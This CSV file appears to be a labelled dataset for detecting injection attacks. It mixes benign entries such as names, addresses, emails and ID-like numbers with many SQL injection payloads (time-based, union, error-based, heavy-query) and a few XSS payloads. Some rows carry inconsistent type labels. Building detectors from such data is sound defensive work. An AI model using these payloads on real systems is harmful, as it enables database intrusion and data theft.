Text,attack_type,Label,type
isidro,norm,0,normal
epifita,norm,0,normal
1635,norm,0,normal
rees,norm,0,normal
"1"") as ifgl where 2190=2190 rlike (select (case when (7689=7689) then 1 else 0x28 end))--",sqli,1,sql
"1')));select like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((('atvu'='atvu",sqli,1,sql
9570,norm,0,normal
rom87231o,norm,0,normal
"1'+(select luwn where 1214=1214 union all select null,null,null,null,null,null#",sqli,1,sql
ceumar,norm,0,normal
bloc sant simo 93,norm,0,normal
acordelar,norm,0,normal
"calle alonso de matos 174,",norm,0,normal
"1') as bdei where 9531=9531 and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
"1) as jqbv where 8172=8172 and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
trombn,norm,0,normal
25500,norm,0,normal
ozoa cadaveira,norm,0,normal
"-2226%"")) union all select 1018,1018,1018,1018--",sqli,1,sql
cruttenden@saludyfitness.ca,norm,0,normal
re98329e,norm,0,normal
38787,norm,0,normal
horatio,norm,0,normal
"1%"" or 4240=(select 4240 from pg_sleep(5))--",sqli,1,sql
1')) as hpta where 5376=5376 waitfor delay '0:0:5'--,sqli,1,sql
ser?ado,norm,0,normal
37311,norm,0,normal
"-6527')) union all select 5053,5053,5053,5053--",sqli,1,sql
marciniu,norm,0,normal
85673796s,norm,0,normal
2161o1o,norm,0,normal
06966107m,norm,0,normal
"1%');select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ('%'='",sqli,1,sql
"1'))) and elt(2506=2383,2383) and ((('bjrj'='bjrj",sqli,1,normal
brandt,norm,0,normal
"1));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,1,sql
ohtomo@aldufa.im,norm,0,normal
"1)) or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",sqli,1,sql
06a45s3s,norm,0,normal
enardecedora,norm,0,normal
jia,norm,0,normal
burrud-gyoengyoessy@carloshoya.com.pr,norm,0,normal
"el provencio, 6 8f",norm,0,normal
-5694)) as cxnb where 6858=6858 or 9323=9323#,sqli,1,normal
cusanelli@wdsl.ao,norm,0,normal
"1%'))) and elt(1210=1210,sleep(5)) and ((('%'='",sqli,1,normal
"calle tren 8, 8?h",norm,0,normal
"1%')) or 8156=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
1%'))) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ((('%'=',sqli,1,sql
"-2048)) union all select 7054,7054,7054,7054,7054,7054,7054,7054,7054--",sqli,1,sql
chanco,norm,0,normal
1');select sleep(5) and ('hhlq' like 'hhlq,sqli,1,sql
"1')) or 8421=(select count(*) from generate_series(1,5000000)) and (('qgov'='qgov",sqli,1,sql
rubena,norm,0,normal
1')));select (case when (5768=9169) then 5768 else 1/(select 0) end)--,sqli,1,sql
zackaria8,norm,0,normal
-1641')) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (('vgcb' like 'vgcb,sqli,1,sql
aldearrodrigo,norm,0,normal
1891285759644518,norm,0,normal
modorrillo,norm,0,normal
antone1@tiendasyofertas.ve,norm,0,normal
lamontag,norm,0,normal
"-5863"" or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ""gkvy""=""gkvy",sqli,1,sql
trgono,norm,0,normal
lazagurra,norm,0,normal
tilton,norm,0,normal
rube,norm,0,normal
"1%""));begin dbms_lock.sleep(5); end--",sqli,1,sql
-4137)) as elxu where 5672=5672 order by 1--,sqli,1,sql
"1') as elnu where 5719=5719 or 8156=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
"1"") where 2496=2496;select * from generate_series(7667,7667,case when (7667=8232) then 1 else 0 end) limit 1--",sqli,1,sql
delmare.seidner@vinavilano.tn,norm,0,normal
08011,norm,0,normal
sarteneja,norm,0,normal
47173,norm,0,normal
21468433a,norm,0,normal
"1',(select (case when (5249=9648) then 1 else 1/(select 0) end))",sqli,1,sql
scorziel,norm,0,normal
12064316b,norm,0,normal
montell i martinet,norm,0,normal
"1%"") or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
40197,norm,0,normal
"1'+(select 'zugq' where 9218=9218;select * from generate_series(7536,7536,case when (7536=7523) then 1 else 0 end) limit 1--",sqli,1,sql
"ciri, 23, 5?a",norm,0,normal
-3582') or 6872=6872 and ('gyfj'='gyfj,sqli,1,normal
serratosa@yiutuve.pe,norm,0,normal
"1)) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((5200=5200",sqli,1,sql
63313769j,norm,0,normal
porro,norm,0,normal
bustillo de la vega,norm,0,normal
"c/ veinat de cerdanyola, 3 6e",norm,0,normal
burguez bonany,norm,0,normal
"<iframe id=xss / ""onload=alert(/xss/)></iframe>",xss,2,xss
"1'+(select 'ixza' where 4374=4374 union all select null,null,null--",sqli,1,sql
928,norm,0,normal
0570146007146945,norm,0,normal
"1"";call regexp_substring(repeat(right(char(3702),0),500000000),null) and ""dwbh"" like ""dwbh",sqli,1,sql
emparan carpio,norm,0,normal
"san jorge, 188",norm,0,normal
"1') or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
readling,norm,0,normal
66753049b,norm,0,normal
3453010918102829,norm,0,normal
9457153149790079,norm,0,normal
"-9505'))) or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((('qhdg'='qhdg",sqli,1,sql
rascadura,norm,0,normal
7686271480294625,norm,0,normal
"calle manzanilla 141,",norm,0,normal
46440,norm,0,normal
demorest,norm,0,normal
1'+(select trte where 9173=9173 and 2006=2006,sqli,1,sql
"1)));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and (((4537=4537",sqli,1,sql
alcoleja,norm,0,normal
"calle membezar 0, 2?c",norm,0,normal
cerralbo,norm,0,normal
"1'||(select 'lzzr' where 2477=2477;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)||'",sqli,1,sql
"plza. mariano arregui canela 171,",norm,0,normal
201,norm,0,normal
flo3a,norm,0,normal
-8922 or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq')-- krmh,sqli,1,sql
6o7zo6a,norm,0,normal
smelters,norm,0,normal
"praza pascasio fernandez seguin, 73,",norm,0,normal
reilly-pidgeon@interpretacion-diccionario-y-significado-de-los-s,norm,0,normal
"1%"") procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",sqli,1,normal
"1') as knxr where 5662=5662 union all select null,null,null,null,null,null,null,null#",sqli,1,sql
cuevas de san clemente,norm,0,normal
lidia,norm,0,normal
ras4rojar,norm,0,normal
abs hosta,norm,0,normal
"1) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (9841=9841",sqli,1,sql
1)) as zpvn where 2767=2767 rlike (select (case when (7689=7689) then 1 else 0x28 end))--,sqli,1,sql
sanet y negrals,norm,0,normal
">""<!-- -- --><script>document.cookie=true;</script><!-- -- -->",xss,2,xss
1') and sleep(5) and ('orxt'='orxt,sqli,1,normal
macrura,norm,0,normal
"1) as zbha where 9700=9700 or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
"plaa de gaudi, 57, 8?e",norm,0,normal
6o40o41,norm,0,normal
inescourt7@citycvs.mil,norm,0,normal
jener monaj,norm,0,normal
"1') and 8407=(select count(*) from generate_series(1,5000000)) and ('qfwc'='qfwc",sqli,1,sql
kussauer_brereton@showcarsmadrid.com.kp,norm,0,normal
pettingill@demasiado.com.bv,norm,0,normal
4979216909976076,norm,0,normal
mccarthy.darcy@tantomontamontatanto.jo,norm,0,normal
ayunque,norm,0,normal
abarraganamiento,norm,0,normal
concursado,norm,0,normal
hasbrouc,norm,0,normal
82311327p,norm,0,normal
"<div style=""background-image: url(javascript:document.cookie=true;);"">",xss,2,xss
jaraba villa,norm,0,normal
cioffi,norm,0,normal
81180031j,norm,0,normal
-8099%')) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (('%'=',sqli,1,sql
"calle francisco gervas, 174, 9h",norm,0,normal
novallas,norm,0,normal
sorci3@lamola-hotel.gr,norm,0,normal
"1)) union all select null,null,null,null#",sqli,1,sql
amaranta,norm,0,normal
1'+(select somn where 8636=8636 rlike sleep(5))+',sqli,1,sql
"1;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3# sfup",sqli,1,sql
"1) and elt(1210=1210,sleep(5)) and (1915=1915",sqli,1,normal
"-9171) union all select 6880,6880,6880,6880,6880,6880,6880#",sqli,1,sql
"1"")) as qejm where 9014=9014 union all select null,null,null,null,null,null#",sqli,1,sql
44322044d,norm,0,normal
1888,norm,0,normal
olid seuba,norm,0,normal
1')) and 8594=(select 8594 from pg_sleep(5))--,sqli,1,sql
8352,norm,0,normal
1);select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,sqli,1,sql
"lola flores, 98 3?h",norm,0,normal
"1"")) and make_set(8403=8403,8899) and ((""ieuj"" like ""ieuj",sqli,1,normal
3582197540300309,norm,0,normal
95549133a,norm,0,normal
"1) as vzyk where 5103=5103 and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",sqli,1,sql
"-8833')) union all select 3227,3227,3227,3227,3227--",sqli,1,sql
"-8060"") where 5290=5290 or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq')--",sqli,1,sql
0680099679266442,norm,0,normal
"1%"" and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ""%""=""",sqli,1,sql
8005,norm,0,normal
49439340n,norm,0,normal
"c/ maestro vives, s/n",norm,0,normal
"1)) as spdf where 8554=8554 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)--",sqli,1,sql
"calle carlos amel, 32, 12?h",norm,0,normal
"1')) and elt(3114=3114,sleep(5))#",sqli,1,normal
canfranc,norm,0,normal
"1';select like('abcdefg',upper(hex(randomblob(500000000/2))))",sqli,1,sql
8516,norm,0,normal
"-4381 or make_set(6118=3095,3095)# lkcr",sqli,1,normal
49660,norm,0,normal
"1' in boolean mode) union all select null,null--",sqli,1,sql
kedah,norm,0,normal
"1')) as fcjk where 7755=7755;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual--",sqli,1,sql
faustino cavadas 162 6-a,norm,0,normal
feld_zaleska@laschinas.pl,norm,0,normal
"1'||(select 'vwop' where 8536=8536 or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
claudiano,norm,0,normal
1%');begin user_lock.sleep(5); end--,sqli,1,sql
"calle can puigdorfila 41, 2?g",norm,0,normal
-4828%') or 8678=5745#,sqli,1,normal
"-3209'+(select ldum where 9912=9912 union all select 9912,9912,9912,9912#",sqli,1,sql
raddie,norm,0,normal
karlette24,norm,0,normal
03158,norm,0,normal
"1') and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ('fnjm'='fnjm",sqli,1,sql
antoliano,norm,0,normal
fuentelmonge,norm,0,normal
bobadilla del campo,norm,0,normal
huyente,norm,0,normal
09831514a,norm,0,normal
18120,norm,0,normal
belmonte de gracin,norm,0,normal
"1%'))) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((('%'='",sqli,1,normal
"1')(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and ('vjnf' like 'vjnf",sqli,1,sql
palmer manzano,norm,0,normal
1') as ulbr where 7233=7233 and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--,sqli,1,sql
kukier policastro,norm,0,normal
mirambell donet,norm,0,normal
50296,norm,0,normal
aarn,norm,0,normal
subidor,norm,0,normal
sancho,norm,0,normal
3260901599339838,norm,0,normal
1')) and (3020=3020)*6703 and (('vvkd' like 'vvkd,sqli,1,normal
ballista@kpincentives.sa,norm,0,normal
10696,norm,0,normal
cane@meneamex.br,norm,0,normal
"1"")) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and ((""gcyp"" like ""gcyp",sqli,1,sql
1%')) and 7160=7249--,sqli,1,sql
"1;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
"-6854"" where 7794=7794 union all select 7794,7794--",sqli,1,sql
"-5819%"")) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ((""%""=""",sqli,1,sql
jodie,norm,0,normal
zahn,norm,0,normal
inca,norm,0,normal
saus llaras,norm,0,normal
43507844d,norm,0,normal
"calle arc de sant marti, 56",norm,0,normal
-2530%' order by 1#,sqli,1,normal
1%';select case when 7717=7717 then 1 else null end--,sqli,1,sql
hamzeh,norm,0,normal
703,norm,0,normal
"1) as wvpl where 9791=9791 and make_set(3491=9067,9067)--",sqli,1,sql
"plaa llimoner 81,",norm,0,normal
"-7715') union all select 4830,4830,4830,4830,4830,4830,4830,4830--",sqli,1,sql
gallegos angeleri,norm,0,normal
-7378' or 6872=6872 and 'bnmn' like 'bnmn,sqli,1,normal
suray,norm,0,normal
9423,norm,0,normal
98089077b,norm,0,normal
23543482s,norm,0,normal
kurtiz_saiah4@magadan.com.ro,norm,0,normal
"1'||(select 'lljg' from dual where 7631=7631;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)||'",sqli,1,sql
"1)));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",sqli,1,sql
2044220684799297,norm,0,normal
1' and 2908=8067--,sqli,1,sql
1'||(select 'lnhq' where 7526=7526;if(7899=7899) select 7899 else drop function zbbp--,sqli,1,sql
inconse_cuente,norm,0,normal
9629,norm,0,normal
45939,norm,0,normal
edel,norm,0,normal
menju,norm,0,normal
bofarull,norm,0,normal
"-8073))) union all select 4481,4481,4481,4481--",sqli,1,sql
2447862424263500,norm,0,normal
1' where 8469=8469;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,sqli,1,sql
"1'));select like('abcdefg',upper(hex(randomblob(500000000/2)))) and (('kyos' like 'kyos",sqli,1,sql
ecija 51 12-h,norm,0,normal
"-2925%"" or make_set(9354=9354,7185) and ""%""=""",sqli,1,normal
1947,norm,0,normal
odden,norm,0,normal
0330245164005176,norm,0,normal
mascaro-cimino@3horas.dk,norm,0,normal
1 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')# twev,sqli,1,sql
merriell,norm,0,normal
-4494 or 5291=4452,sqli,1,normal
rudich,norm,0,normal
ad8ma45ino,norm,0,normal
"1""));(select * from (select(sleep(5)))acdk)#",sqli,1,sql
0095634128871613,norm,0,normal
mata hita,norm,0,normal
"1) where 2679=2679 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
"1'||(select 'iocs' where 9287=9287 and 8407=(select count(*) from generate_series(1,5000000)))||'",sqli,1,sql
"1'||(select 'fbtm' where 1335=1335 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)))||'",sqli,1,sql
sustanciosa,norm,0,normal
"1 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))-- gkcl",sqli,1,sql
"c/ paterna, s/n, 11h",norm,0,normal
"1) as pyjx where 9005=9005;select benchmark(5000000,md5(0x714e4153))#",sqli,1,sql
cerveruela,norm,0,normal
31282,norm,0,normal
"1' and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and 'fjfo'='fjfo",sqli,1,normal
astigarraga,norm,0,normal
requena de campos,norm,0,normal
7008973356777544,norm,0,normal
ji1a,norm,0,normal
""";alert('xss)//",xss,2,sql
"1"") union all select null,null,null,null,null,null#",sqli,1,sql
09737,norm,0,normal
herreta taul,norm,0,normal
"1)) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and ((5524=5524",sqli,1,sql
trisca,norm,0,normal
"1',(select (case when (3902=3902) then (select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) else 1/(select 0 from dual) end) from dual)",sqli,1,sql
corazones 168,norm,0,normal
doz,norm,0,normal
istn,norm,0,normal
espuna,norm,0,normal
98458242a,norm,0,normal
colrico,norm,0,normal
"1')));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ((('vcgc' like 'vcgc",sqli,1,sql
entregadora,norm,0,normal
gabby,norm,0,normal
1')) and (select * from (select(sleep(5)))fzno) and (('tjvy' like 'tjvy,sqli,1,sql
"-6731"" where 6166=6166 union all select 6166,6166,6166,6166,6166,6166--",sqli,1,sql
silvio,norm,0,normal
6113595872626667,norm,0,normal
60201082p,norm,0,normal
"cantallops, 138,",norm,0,normal
"1"") where 7840=7840 union all select null,null#",sqli,1,sql
"1')) as prxm where 1267=1267 and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
buleje quesada,norm,0,normal
5349288055787524,norm,0,normal
sinforiano,norm,0,normal
"1'||(select 'bccx' where 5881=5881 and elt(1210=1210,sleep(5)))||'",sqli,1,sql
cavey.cox@directoriogratuito.ec,norm,0,normal
maala8,norm,0,normal
soules,norm,0,normal
36,norm,0,normal
saetero farrer,norm,0,normal
5257931647701652,norm,0,normal
1);select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,sqli,1,sql
chilches/xilxes,norm,0,normal
"1"") and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and (""liar""=""liar",sqli,1,sql
1309699590331954,norm,0,normal
vidrioso,norm,0,normal
"1)) as krzi where 8727=8727 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
inciertamente,norm,0,normal
munera,norm,0,normal
1' where 8231=8231;select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,1,sql
prueba,norm,0,normal
catoira,norm,0,normal
9828593749535082,norm,0,normal
1') as yqld where 2489=2489;waitfor delay '0:0:5'--,sqli,1,sql
21096784b,norm,0,normal
"1"") where 7228=7228;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
1'+(select 'sfko' where 6853=6853 rlike sleep(5)#,sqli,1,sql
lockin.konstantia@modeloscaninos.kn,norm,0,normal
c/ coca de la piera 167,norm,0,normal
bow@whitepearlresort.pl,norm,0,normal
"1')) and elt(1210=1210,sleep(5)) and (('jnmf'='jnmf",sqli,1,normal
1) or 6793=(select 6793 from pg_sleep(5)),sqli,1,sql
7013,norm,0,normal
fundamentalmente,norm,0,normal
barbimore_na,norm,0,normal
"1%'));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and (('%'='",sqli,1,sql
delbert,norm,0,normal
1%')) or sleep(5) and (('%'=',sqli,1,normal
"1"") and 3824=benchmark(5000000,md5(0x76555642)) and (""vxec"" like ""vxec",sqli,1,normal
hilda,norm,0,normal
1%' and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and '%'=',sqli,1,sql
karel,norm,0,normal
"1' and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and 'fmkz' like 'fmkz",sqli,1,sql
-2393%')) union all select 2772--,sqli,1,sql
"playa postiguet 81,",norm,0,normal
villanueva del campillo,norm,0,normal
"1"");(select * from (select(sleep(5)))srmq) and (""vjlr"" like ""vjlr",sqli,1,sql
mo8os7,norm,0,normal
caleta,norm,0,normal
amine,norm,0,normal
"-6492') union all select 7204,7204--",sqli,1,sql
"c/ pablo iglesias, 116",norm,0,normal
"1'+(select jley where 3581=3581 and 2388=benchmark(5000000,md5(0x6d457153))#",sqli,1,sql
zohreh,norm,0,normal
partello,norm,0,normal
atea,norm,0,normal
18449,norm,0,normal
"1;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual# gnga",sqli,1,sql
"1"") where 4913=4913;begin user_lock.sleep(5); end--",sqli,1,sql
rebolledo tabernero,norm,0,normal
"1')) union all select null,null,null,null#",sqli,1,sql
"1"")) as ufba where 4049=4049;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",sqli,1,sql
gueldos donohue,norm,0,normal
vizcaya,norm,0,normal
longstaff elecciones,norm,0,normal
"1"") where 1705=1705;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#",sqli,1,sql
"1));select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",sqli,1,sql
"1')) or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
-7435') where 6242=6242 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--,sqli,1,sql
-8010' or (2225=8491)*8491 and 'eipf'='eipf,sqli,1,normal
33273113w,norm,0,normal
carson,norm,0,normal
1'||(select 'bsbv' from dual where 5276=5276 or (select * from (select(sleep(5)))ydpu))||',sqli,1,sql
7an8o15a,norm,0,normal
1%') and sleep(5) and ('%'=',sqli,1,normal
sandy,norm,0,normal
"1%') and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ('%'='",sqli,1,sql
hixson,norm,0,normal
"1%""));select count(*) from generate_series(1,5000000) and ((""%""=""",sqli,1,sql
llambilles,norm,0,normal
1 where 4641=4641;select (case when (9540=5786) then 9540 else 9540*(select 9540 from information_schema.character_sets) end)#,sqli,1,sql
42798379w,norm,0,normal
-1564') order by 1--,sqli,1,sql
"1'||(select 'mdqc' where 4533=4533 and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
2296524964972310,norm,0,normal
redmond-delcampe@biosaludsystems.do,norm,0,normal
herodes,norm,0,normal
"-5817' in boolean mode) union all select 2391,2391,2391,2391,2391--",sqli,1,sql
"-1844"" where 7948=7948 or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",sqli,1,sql
1'||(select 'oxdh' where 6967=6967 and sleep(5)#,sqli,1,sql
33300,norm,0,normal
"1));select like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((7749=7749",sqli,1,sql
"1' and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and 'egye'='egye",sqli,1,normal
3892784649587009,norm,0,normal
v9n939z6,norm,0,normal
4ip7237o8h2dira,norm,0,normal
3161746053397457,norm,0,normal
gwenny,norm,0,normal
"1"" waitfor delay '0:0:5' and ""dvfr"" like ""dvfr",sqli,1,normal
13258011y,norm,0,normal
corcos,norm,0,normal
"costa rica, 112",norm,0,normal
"1') as pghp where 9086=9086;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",sqli,1,sql
2070765320009143,norm,0,normal
c/ rio segura 76,norm,0,normal
7509082311963954,norm,0,normal
"1) as zdym where 1578=1578 union all select null,null,null#",sqli,1,sql
7791374198907519,norm,0,normal
callaway.nererova@mirallesmoscardo.ca,norm,0,normal
"1) as lisg where 5490=5490;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",sqli,1,sql
"1) and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
"-5109))) or make_set(6627=7331,7331) and (((9466=9466",sqli,1,normal
matie,norm,0,normal
"1%')));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",sqli,1,sql
"1')) as sxpk where 5524=5524 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)--",sqli,1,sql
"c/ fancelli, 34 6b",norm,0,normal
orazio,norm,0,normal
"capmany, 94 4?e",norm,0,normal
"1) where 3062=3062 or 8466=benchmark(5000000,md5(0x694a4745))--",sqli,1,sql
darbie,norm,0,normal
75459581p,norm,0,normal
"1""));iif(8770=9611,1,1/0)",sqli,1,sql
ivorra,norm,0,normal
"1')) as lizu where 7691=7691 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
petruck,norm,0,normal
bezoar,norm,0,normal
"1%'));select benchmark(5000000,md5(0x714e4153))#",sqli,1,sql
"1"" where 6352=6352;begin dbms_lock.sleep(5); end--",sqli,1,sql
"1'))) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('fzgy'='fzgy",sqli,1,sql
47343175k,norm,0,normal
"1) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and (5621=5621",sqli,1,normal
37520,norm,0,normal
1'+(select 'kicv' where 1976=1976 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual))+',sqli,1,sql
0399278648684869,norm,0,normal
